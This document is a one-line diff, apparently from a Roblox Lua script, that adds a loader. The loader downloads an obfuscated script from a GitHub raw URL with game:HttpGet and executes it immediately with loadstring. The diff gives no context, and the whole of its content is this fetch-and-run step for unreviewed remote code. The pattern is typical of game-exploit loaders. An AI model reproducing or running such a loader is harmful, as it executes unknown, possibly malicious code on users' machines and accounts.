@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alazoy/alazoy/main/obf_Ke5HDaov4nP1IRrIPupw0JdQVQ232veHc85oT8VQhQC6ad615J0hhI2jukfiJe3g.lua",true))()
